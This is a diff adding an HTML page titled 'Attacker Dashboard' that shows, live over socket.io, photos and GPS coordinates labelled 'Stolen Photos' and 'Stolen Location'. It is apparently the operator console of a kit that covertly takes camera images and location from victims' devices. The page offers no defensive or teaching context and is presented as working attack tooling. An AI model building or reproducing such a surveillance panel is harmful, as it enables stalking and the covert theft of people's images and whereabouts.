@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Dashboard</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a0a;
+            color: #0f0;
+            font-family: monospace;
+            padding: 16px;
+        }
+        .header { border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; }
+        .stats { background: #1a1a1a; padding: 12px; margin: 15px 0; border-radius: 8px; }
+        .photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; }
+        .photo-grid img { width: 100px; border: 2px solid #0f0; border-radius: 4px; }
+        .location { background: #1a1a1a; padding: 10px; margin: 10px 0; border-left: 3px solid #0f0; }
+        .live { color: #ff0000; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+<div class="header">
+    <h1>🔴 ATTACKER DASHBOARD</h1>
+    <div class="live">● LIVE STEALING</div>
+</div>
+
+<div class="stats" id="stats">📸 Photos: 0</div>
+
+<h2>📍 Stolen Location</h2>
+<div id="locationDiv"></div>
+
+<h2>📸 Stolen Photos</h2>
+<div id="photoGrid" class="photo-grid"></div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    let photoCount = 0;
+    
+    socket.on('new_photo', (data) => {
+        photoCount++;
+        document.getElementById('stats').innerHTML = `📸 Photos: ${photoCount}`;
+        const grid = document.getElementById('photoGrid');
+        const img = document.createElement('img');
+        img.src = data.imageData;
+        grid.prepend(img);
+        while(grid.children.length > 30) grid.removeChild(grid.lastChild);
+    });
+    
+    socket.on('new_location', (data) => {
+        document.getElementById('locationDiv').innerHTML = `
+            <div class="location">
+                📍 Lat: ${data.lat}<br>
+                📍 Lng: ${data.lng}<br>
+                🎯 Accuracy: ${data.accuracy}m
+            </div>
+        `;
+    });
+</script>
+</body>
+</html>
